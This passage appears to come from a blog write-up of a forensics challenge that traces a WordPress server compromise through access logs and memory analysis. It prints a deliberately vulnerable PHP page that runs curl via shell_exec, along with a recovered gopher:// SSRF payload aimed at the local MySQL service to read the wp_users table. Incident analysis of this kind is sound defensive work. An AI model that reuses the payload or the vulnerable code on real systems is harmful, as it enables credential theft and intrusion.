</span></span><span class=line><span class=cl>192.168.122.158 - - <span class=o>[</span>27/Dec/2018:19:51:32 +0100<span class=o>]</span> <span class=s2>&#34;GET /favicon.ico HTTP/1.1&#34;</span> <span class=m>404</span> <span class=m>506</span> <span class=s2>&#34;-&#34;</span> <span class=s2>&#34;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0&#34;</span>
</span></span><span class=line><span class=cl>192.168.122.158 - - <span class=o>[</span>27/Dec/2018:19:51:40 +0100<span class=o>]</span> <span class=s2>&#34;POST /test.php HTTP/1.1&#34;</span> <span class=m>200</span> <span class=m>443</span> <span class=s2>&#34;http://192.168.122.216/test.php&#34;</span> <span class=s2>&#34;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0&#34;</span>
</span></span><span class=line><span class=cl>192.168.122.158 - - <span class=o>[</span>27/Dec/2018:19:51:40 +0100<span class=o>]</span> <span class=s2>&#34;GET /favicon.ico HTTP/1.1&#34;</span> <span class=m>404</span> <span class=m>506</span> <span class=s2>&#34;-&#34;</span> <span class=s2>&#34;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0&#34;</span>
</span></span><span class=line><span class=cl>192.168.122.158 - - <span class=o>[</span>27/Dec/2018:19:51:53 +0100<span class=o>]</span> <span class=s2>&#34;POST /test.php HTTP/1.1&#34;</span> <span class=m>200</span> <span class=m>437</span> <span class=s2>&#34;http://192.168.122.216/test.php&#34;</span> <span class=s2>&#34;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0&#34;</span>
</span></span><span class=line><span class=cl>192.168.122.158 - - <span class=o>[</span>27/Dec/2018:19:51:54 +0100<span class=o>]</span> <span class=s2>&#34;GET /favicon.ico HTTP/1.1&#34;</span> <span class=m>404</span> <span class=m>506</span> <span class=s2>&#34;-&#34;</span> <span class=s2>&#34;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0&#34;</span>
</span></span><span class=line><span class=cl>192.168.122.158 - - <span class=o>[</span>27/Dec/2018:19:57:32 +0100<span class=o>]</span> <span class=s2>&#34;POST /test.php HTTP/1.1&#34;</span> <span class=m>200</span> <span class=m>434</span> <span class=s2>&#34;http://192.168.122.216/test.php&#34;</span> <span class=s2>&#34;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0&#34;</span>
</span></span><span class=line><span class=cl>192.168.122.158 - - <span class=o>[</span>27/Dec/2018:19:57:32 +0100<span class=o>]</span> <span class=s2>&#34;GET /favicon.ico HTTP/1.1&#34;</span> <span class=m>404</span> <span class=m>506</span> <span class=s2>&#34;-&#34;</span> <span class=s2>&#34;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0&#34;</span>
</span></span><span class=line><span class=cl>192.168.122.158 - - <span class=o>[</span>27/Dec/2018:19:57:38 +0100<span class=o>]</span> <span class=s2>&#34;POST /test.php HTTP/1.1&#34;</span> <span class=m>200</span> <span class=m>2076</span> <span class=s2>&#34;http://192.168.122.216/test.php&#34;</span> <span class=s2>&#34;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0&#34;</span>
</span></span><span class=line><span class=cl>192.168.122.158 - - <span class=o>[</span>27/Dec/2018:19:57:38 +0100<span class=o>]</span> <span class=s2>&#34;GET /favicon.ico HTTP/1.1&#34;</span> <span class=m>404</span> <span class=m>506</span> <span class=s2>&#34;-&#34;</span> <span class=s2>&#34;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0&#34;</span>
</span></span><span class=line><span class=cl>192.168.122.158 - - <span class=o>[</span>27/Dec/2018:19:58:39 +0100<span class=o>]</span> <span class=s2>&#34;GET / HTTP/1.0&#34;</span> <span class=m>200</span> <span class=m>17847</span> <span class=s2>&#34;-&#34;</span> <span class=s2>&#34;-&#34;</span>
</span></span><span class=line><span class=cl>--
</span></span><span class=line><span class=cl>192.168.122.158 - - <span class=o>[</span>27/Dec/2018:19:58:58 +0100<span class=o>]</span> <span class=s2>&#34;POST /test.php HTTP/1.1&#34;</span> <span class=m>200</span> <span class=m>927</span> <span class=s2>&#34;http://192.168.122.216/test.php&#34;</span> <span class=s2>&#34;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0&#34;</span>
</span></span><span class=line><span class=cl>192.168.122.158 - - <span class=o>[</span>27/Dec/2018:19:58:58 +0100<span class=o>]</span> <span class=s2>&#34;GET /favicon.ico HTTP/1.1&#34;</span> <span class=m>404</span> <span class=m>506</span> <span class=s2>&#34;-&#34;</span> <span class=s2>&#34;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0&#34;</span>
</span></span><span class=line><span class=cl>192.168.122.158 - - <span class=o>[</span>27/Dec/2018:20:52:48 +0100<span class=o>]</span> <span class=s2>&#34;GET /wp-admin/ HTTP/1.1&#34;</span> <span class=m>302</span> <span class=m>410</span> <span class=s2>&#34;-&#34;</span> <span class=s2>&#34;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0&#34;</span>
</span></span><span class=line><span class=cl>192.168.122.158 - - <span class=o>[</span>27/Dec/2018:20:52:49 +0100<span class=o>]</span> <span class=s2>&#34;GET /wp-login.php?redirect_to=http%3A%2F%2F192.168.122.216%2Fwp-admin%2F&amp;reauth=1 HTTP/1.1&#34;</span> <span class=m>200</span> <span class=m>3608</span> <span class=s2>&#34;-&#34;</span> <span class=s2>&#34;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0&#34;</span>
</span></span><span class=line><span class=cl>192.168.122.158 - - <span class=o>[</span>27/Dec/2018:20:52:49 +0100<span class=o>]</span> <span class=s2>&#34;GET /wp-includes/css/dashicons.min.css?ver=5.0.2 HTTP/1.1&#34;</span> <span class=m>200</span> <span class=m>28983</span> <span class=s2>&#34;http://192.168.122.216/wp-login.php?redirect_to=http%3A%2F%2F192.168.122.216%2Fwp-admin%2F&amp;reauth=1&#34;</span> <span class=s2>&#34;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0&#34;</span>
</span></span></code></pre></td></tr></table></div></div><p>Monique must found something on her last request because she decided to go on WordPress admin panel: <code>wp-admin</code>. She probably discovered something that allowed her to log on as <strong>eddiethehead</strong>.</p><p>However, we need to stay focus on our task: finding the entry point. The attacker requested many time <code>test.php</code> web page before logging in. She must have exploit something at <code>19:58:58</code>.</p><p>Here are <code>test.php</code> and <code>config_test.php</code> web pages:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>webserver $ cat /var/www/html/test.php
</span></span><span class=line><span class=cl>&lt;?php 
</span></span><span class=line><span class=cl>include_once <span class=s2>&#34;config_test.php&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>?&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;html&gt;
</span></span><span class=line><span class=cl>&lt;head&gt;
</span></span><span class=line><span class=cl>	&lt;title&gt;Super curling&lt;/title&gt;
</span></span><span class=line><span class=cl>&lt;/head&gt;
</span></span><span class=line><span class=cl>&lt;body&gt;
</span></span><span class=line><span class=cl>	&lt;form <span class=nv>action</span><span class=o>=</span><span class=s2>&#34;test.php&#34;</span> <span class=nv>method</span><span class=o>=</span><span class=s2>&#34;post&#34;</span>&gt;
</span></span><span class=line><span class=cl>		URL Checker - Beta: 
</span></span><span class=line><span class=cl>		&lt;input <span class=nv>type</span><span class=o>=</span><span class=s2>&#34;text&#34;</span> <span class=nv>name</span><span class=o>=</span><span class=s1>&#39;url&#39;</span> /&gt;		
</span></span><span class=line><span class=cl>	&lt;/form&gt;
</span></span><span class=line><span class=cl>&lt;?php
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=o>(</span>isset<span class=o>(</span><span class=nv>$_POST</span><span class=o>[</span><span class=s1>&#39;url&#39;</span><span class=o>])&amp;&amp;</span>!empty<span class=o>(</span><span class=nv>$_POST</span><span class=o>[</span><span class=s1>&#39;url&#39;</span><span class=o>]))</span>
</span></span><span class=line><span class=cl><span class=o>{</span>
</span></span><span class=line><span class=cl>	<span class=nv>$url</span> <span class=o>=</span> <span class=nv>$_POST</span><span class=o>[</span><span class=s1>&#39;url&#39;</span><span class=o>]</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=nv>$content_url</span> <span class=o>=</span> getUrlContent<span class=o>(</span><span class=nv>$url</span><span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span><span class=line><span class=cl><span class=k>else</span>
</span></span><span class=line><span class=cl><span class=o>{</span>
</span></span><span class=line><span class=cl>	<span class=nv>$content_url</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=o>(</span>isset<span class=o>(</span><span class=nv>$_GET</span><span class=o>[</span><span class=s1>&#39;debug&#39;</span><span class=o>]))</span>
</span></span><span class=line><span class=cl><span class=o>{</span>
</span></span><span class=line><span class=cl>	show_source<span class=o>(</span>__FILE__<span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span><span class=line><span class=cl>?&gt; 
</span></span><span class=line><span class=cl>&lt;/body&gt;
</span></span><span class=line><span class=cl>&lt;/html&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>webserver $ cat /var/www/html/config_test.php
</span></span><span class=line><span class=cl>&lt;?php
</span></span><span class=line><span class=cl><span class=k>function</span> safe<span class=o>(</span><span class=nv>$url</span><span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>{</span>
</span></span><span class=line><span class=cl>	<span class=nv>$tmpurl</span> <span class=o>=</span> parse_url<span class=o>(</span><span class=nv>$url</span>, PHP_URL_HOST<span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span><span class=o>(</span><span class=nv>$tmpurl</span> !<span class=o>=</span> <span class=s2>&#34;localhost&#34;</span> and <span class=nv>$tmpurl</span> !<span class=o>=</span> <span class=s2>&#34;127.0.0.1&#34;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>	<span class=o>{</span>
</span></span><span class=line><span class=cl>		var_dump<span class=o>(</span><span class=nv>$tmpurl</span><span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		die<span class=o>(</span><span class=s2>&#34;&lt;h1&gt;Only access to localhost&lt;/h1&gt;&#34;</span><span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=o>}</span>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=nv>$url</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>function</span> getUrlContent<span class=o>(</span><span class=nv>$url</span><span class=o>){</span>
</span></span><span class=line><span class=cl>	<span class=nv>$url</span> <span class=o>=</span> safe<span class=o>(</span><span class=nv>$url</span><span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=nv>$url</span> <span class=o>=</span> escapeshellarg<span class=o>(</span><span class=nv>$url</span><span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=nv>$pl</span> <span class=o>=</span> <span class=s2>&#34;curl -v &#34;</span>.<span class=nv>$url</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=nb>echo</span> <span class=nv>$pl</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=nv>$content</span> <span class=o>=</span> shell_exec<span class=o>(</span><span class=nv>$pl</span><span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=nb>echo</span> <span class=nv>$content</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=nv>$content</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span><span class=line><span class=cl>?&gt;
</span></span></code></pre></td></tr></table></div></div><p>So this page makes a poor curl on a page located in the localhost (127.0.0.1). Odie told me it was for a course project or something, whatever. He probably got fucked because of this project</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/articles/realgsmoveinsilencelikelasagna/blue_5.gif data-srcset="/lib/images/articles/realgsmoveinsilencelikelasagna/blue_5.gif, /lib/images/articles/realgsmoveinsilencelikelasagna/blue_5.gif 1.5x, /lib/images/articles/realgsmoveinsilencelikelasagna/blue_5.gif 2x" data-sizes=auto alt=/lib/images/articles/realgsmoveinsilencelikelasagna/blue_5.gif title=/lib/images/articles/realgsmoveinsilencelikelasagna/blue_5.gif></p><p>We have found several interesting websites:</p><blockquote><p><a href=https://www.dailysecurity.fr/server-side-request-forgery/ target=_blank rel="noopener noreffer">https://www.dailysecurity.fr/server-side-request-forgery/</a></p></blockquote><blockquote><p><a href=https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery target=_blank rel="noopener noreffer">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery</a></p></blockquote><p>On Geluchat website, Odie sees things about <code>file://</code> and <code>gopher://</code> stuff. Odie is an ethical person and his school too. ENSIBS teach only cyberdefense stuff, not offensive security, it&rsquo;s not CDAISI. Nevertheless, he decided to search into the memory these artifacts. Sometimes we need some luck:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ vol.py --plugins<span class=o>=</span>../plug_vol/ --profile<span class=o>=</span>LinuxOdie_profilex64 -f memory.dmp linux_yarascan -Y <span class=s2>&#34;file://&#34;</span> &gt; yarascan_file
</span></span><span class=line><span class=cl>$ vol.py --plugins<span class=o>=</span>../plug_vol/ --profile<span class=o>=</span>LinuxOdie_profilex64 -f memory.dmp linux_yarascan -Y <span class=s2>&#34;gopher://&#34;</span> &gt; yarascan_gopher
</span></span><span class=line><span class=cl>$ cat yarascan_file <span class=p>|</span> wc -l               
</span></span><span class=line><span class=cl><span class=m>884</span>
</span></span><span class=line><span class=cl>$ cat yarascan_gopher<span class=p>|</span> wc -l
</span></span><span class=line><span class=cl><span class=m>17</span>
</span></span></code></pre></td></tr></table></div></div><p>No more stupid than anyone else, I prefer to start with the smallest file:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ cat yarascan_gopher       
</span></span><span class=line><span class=cl>Task: apache2 pid <span class=m>21463</span> rule r1 addr 0x7f072b473019
</span></span><span class=line><span class=cl>0x7f072b473019  <span class=m>67</span> 6f <span class=m>70</span> <span class=m>68</span> <span class=m>65</span> <span class=m>72</span> 3a 2f 2f <span class=m>31</span> <span class=m>32</span> <span class=m>37</span> 2e <span class=m>30</span> 2e <span class=m>30</span>   gopher://127.0.0
</span></span><span class=line><span class=cl>0x7f072b473029  2e <span class=m>31</span> 3a <span class=m>33</span> <span class=m>33</span> <span class=m>30</span> <span class=m>36</span> 2f 5f <span class=m>25</span> <span class=m>61</span> <span class=m>63</span> <span class=m>25</span> <span class=m>30</span> <span class=m>30</span> <span class=m>25</span>   .1:3306/_%ac%00%
</span></span><span class=line><span class=cl>0x7f072b473039  <span class=m>30</span> <span class=m>30</span> <span class=m>25</span> <span class=m>30</span> <span class=m>31</span> <span class=m>25</span> <span class=m>38</span> <span class=m>35</span> <span class=m>25</span> <span class=m>61</span> <span class=m>32</span> <span class=m>25</span> <span class=m>33</span> <span class=m>66</span> <span class=m>25</span> <span class=m>30</span>   00%01%85%a2%3f%0
</span></span><span class=line><span class=cl>0x7f072b473049  <span class=m>30</span> <span class=m>25</span> <span class=m>30</span> <span class=m>30</span> <span class=m>25</span> <span class=m>30</span> <span class=m>30</span> <span class=m>25</span> <span class=m>30</span> <span class=m>30</span> <span class=m>25</span> <span class=m>30</span> <span class=m>31</span> <span class=m>25</span> <span class=m>32</span> <span class=m>31</span>   0%00%00%00%01%21
</span></span><span class=line><span class=cl>0x7f072b473059  <span class=m>25</span> <span class=m>30</span> <span class=m>30</span> <span class=m>25</span> <span class=m>30</span> <span class=m>30</span> <span class=m>25</span> <span class=m>30</span> <span class=m>30</span> <span class=m>25</span> <span class=m>30</span> <span class=m>30</span> <span class=m>25</span> <span class=m>30</span> <span class=m>30</span> <span class=m>25</span>   %00%00%00%00%00%
</span></span><span class=line><span class=cl>0x7f072b473069  <span class=m>30</span> <span class=m>30</span> <span class=m>25</span> <span class=m>30</span> <span class=m>30</span> <span class=m>25</span> <span class=m>30</span> <span class=m>30</span> <span class=m>25</span> <span class=m>30</span> <span class=m>30</span> <span class=m>25</span> <span class=m>30</span> <span class=m>30</span> <span class=m>25</span> <span class=m>30</span>   00%00%00%00%00%0
</span></span><span class=line><span class=cl>0x7f072b473079  <span class=m>30</span> <span class=m>25</span> <span class=m>30</span> <span class=m>30</span> <span class=m>25</span> <span class=m>30</span> <span class=m>30</span> <span class=m>00</span> <span class=m>33</span> <span class=m>47</span> 2b <span class=m>07</span> 7f <span class=m>00</span> <span class=m>00</span> <span class=m>03</span>   0%00%00.3G+.....
</span></span><span class=line><span class=cl>0x7f072b473089  <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> ff ff ff ff ff ff ff ff <span class=m>05</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>09</span>   ................
</span></span><span class=line><span class=cl>0x7f072b473099  <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> ff ff ff ff <span class=m>01</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> ff ff ff ff <span class=m>08</span>   ................
</span></span><span class=line><span class=cl>0x7f072b4730a9  <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>04</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>06</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> ff ff ff ff ff   ................
</span></span><span class=line><span class=cl>0x7f072b4730b9  ff ff ff <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> f8 <span class=m>90</span> <span class=m>52</span> 2b <span class=m>07</span> 7f <span class=m>00</span> <span class=m>00</span> <span class=m>11</span>   .........R+.....
</span></span><span class=line><span class=cl>0x7f072b4730c9  <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> ff ff ff ff 6f f0 0a bf b7 d0 <span class=m>00</span> <span class=m>80</span> <span class=m>58</span>   .......o.......X
</span></span><span class=line><span class=cl>0x7f072b4730d9  <span class=m>46</span> <span class=nb>fc</span> <span class=m>23</span> <span class=m>07</span> 7f <span class=m>00</span> <span class=m>00</span> <span class=m>18</span> <span class=m>91</span> <span class=m>52</span> 2b <span class=m>07</span> 7f <span class=m>00</span> <span class=m>00</span> <span class=m>11</span>   F.#......R+.....
</span></span><span class=line><span class=cl>0x7f072b4730e9  <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> ff ff ff ff b8 c3 <span class=m>45</span> 9c e2 8b ac be <span class=m>58</span>   .........E.....X
</span></span><span class=line><span class=cl>0x7f072b4730f9  <span class=m>69</span> fd <span class=m>23</span> <span class=m>07</span> 7f <span class=m>00</span> <span class=m>00</span> <span class=m>80</span> <span class=m>33</span> <span class=m>47</span> 2b <span class=m>07</span> 7f <span class=m>00</span> <span class=m>00</span> <span class=m>07</span>   i.#.....3G+.....
</span></span><span class=line><span class=cl>0x7f072b473109  <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> 0a <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> <span class=m>01</span> <span class=m>00</span> <span class=m>00</span> <span class=m>00</span> ff ff ff ff 0b   ................
</span></span></code></pre></td></tr></table></div></div><p>And here is the magic trick:</p><blockquote><p>gopher://127.0.0.1:3306/_%ac%00%00%01%85%a2%3f%00%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00</p></blockquote><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=https://media.giphy.com/media/12NUbkX6p4xOO4/giphy.gif data-srcset="https://media.giphy.com/media/12NUbkX6p4xOO4/giphy.gif, https://media.giphy.com/media/12NUbkX6p4xOO4/giphy.gif 1.5x, https://media.giphy.com/media/12NUbkX6p4xOO4/giphy.gif 2x" data-sizes=auto alt=https://media.giphy.com/media/12NUbkX6p4xOO4/giphy.gif title=https://media.giphy.com/media/12NUbkX6p4xOO4/giphy.gif></p><p>Decoding this data is not really useful&mldr; Some non-printable bytes. Let&rsquo;s extract the memory of the PID <code>21463</code> and fitler on <code>%[0-9]{2}</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ vol.py --plugins<span class=o>=</span>../plug_vol/ --profile<span class=o>=</span>LinuxOdie_profilex64 -f memory.dmp linux_dump_map -s 0x00007f072b400000 -p <span class=m>21463</span> -D .
</span></span><span class=line><span class=cl>$ strings ./task.21463.0x7f072b400000.vma <span class=p>|</span> grep -E <span class=s2>&#34;%[0-9]{2}&#34;</span>
</span></span><span class=line><span class=cl>69%6f%6e%070
</span></span><span class=line><span class=cl>%00%
</span></span><span class=line><span class=cl>9%62
</span></span><span class=line><span class=cl>70%61
</span></span><span class=line><span class=cl>d%20%77%P
</span></span><span class=line><span class=cl><span class=s1>&#39;gopher://127.0.0.1:3306/_%ac%00%00%01%85%a2%3f%00%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00
</span></span></span><span class=line><span class=cl><span class=s1>%62%2e%77%70%5f%75%73%65%72%73%01%00%00%00%01&#39;</span>
</span></span><span class=line><span class=cl>%10gT+
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$ <span class=nb>echo</span> -n <span class=s2>&#34;%69%6f%6e%07%62%70%61%20%77%%ac%00%00%01%85%a2%3f%00%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%62%2e%77%70%5f%75%73%65%72%73%01%00%00%00%01%10&#34;</span> <span class=p>|</span> tr -d <span class=s2>&#34;%&#34;</span> <span class=p>|</span> xxd -r -p
</span></span><span class=line><span class=cl>ionbpa w?!b.wp_users
</span></span></code></pre></td></tr></table></div></div><p>Odie finds the string <code>b.wp_users</code>. In WordPress world, <code>wp_users</code> is the MySQL table where user informations are stored. By user informations, I mean username, hashed password and so on.</p><p>I think we found the entry point: Monique exploited an SSRF and get WordPress credentials stored in the MySQL database.</p><h3 id=reverse-shell>Reverse shell</h3><p>Knowing the entry point (<code>test.php</code>) makes easier to understand why Monique rushed to the WordPress administration page (<code>wp-admin</code>):</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>webserver $ cat access.log <span class=p>|</span> grep <span class=m>158</span> <span class=p>|</span> grep -A <span class=m>4</span> test.php <span class=p>|</span> grep -v -E <span class=s2>&#34;DirBuster|Nmap&#34;</span>
</span></span><span class=line><span class=cl><span class=o>[</span>...<span class=o>]</span>
</span></span><span class=line><span class=cl>192.168.122.158 - - <span class=o>[</span>27/Dec/2018:19:58:58 +0100<span class=o>]</span> <span class=s2>&#34;POST /test.php HTTP/1.1&#34;</span> <span class=m>200</span> <span class=m>927</span> <span class=s2>&#34;http://192.168.122.216/test.php&#34;</span> <span class=s2>&#34;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0&#34;</span>
</span></span><span class=line><span class=cl>192.168.122.158 - - <span class=o>[</span>27/Dec/2018:19:58:58 +0100<span class=o>]</span> <span class=s2>&#34;GET /favicon.ico HTTP/1.1&#34;</span> <span class=m>404</span> <span class=m>506</span> <span class=s2>&#34;-&#34;</span> <span class=s2>&#34;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0&#34;</span>
</span></span><span class=line><span class=cl>192.168.122.158 - - <span class=o>[</span>27/Dec/2018:20:52:48 +0100<span class=o>]</span> <span class=s2>&#34;GET /wp-admin/ HTTP/1.1&#34;</span> <span class=m>302</span> <span class=m>410</span> <span class=s2>&#34;-&#34;</span> <span class=s2>&#34;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0&#34;</span>
</span></span><span class=line><span class=cl>192.168.122.158 - - <span class=o>[</span>27/Dec/2018:20:52:49 +0100<span class=o>]</span> <span class=s2>&#34;GET /wp-login.php?redirect_to=http%3A%2F%2F192.168.122.216%2Fwp-admin%2F&amp;reauth=1 HTTP/1.1&#34;</span> <span class=m>200</span> <span class=m>3608</span> <span class=s2>&#34;-&#34;</span> <span class=s2>&#34;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0&#34;</span>
</span></span><span class=line><span class=cl>192.168.122.158 - - <span class=o>[</span>27/Dec/2018:20:52:49 +0100<span class=o>]</span> <span class=s2>&#34;GET /wp-includes/css/dashicons.min.css?ver=5.0.2 HTTP/1.1&#34;</span> <span class=m>200</span> <span class=m>28983</span> <span class=s2>&#34;http://192.168.122.216/wp-login.php?redirect_to=http%3A%2F%2F192.168.122.216%2Fwp-admin%2F&amp;reauth=1&#34;</span> <span class=s2>&#34;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0&#34;</span>
</span></span></code></pre></td></tr></table></div></div><p>Since there is only one user on the website (<strong>eddiethehead</strong>), it&rsquo;s not really hard to guess with which account Monique logged in. Going down a little bit in the log file, something caught my attention:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>webserver $ cat access.log <span class=p>|</span> less -N
</span></span><span class=line><span class=cl><span class=o>[</span>...<span class=o>]</span>
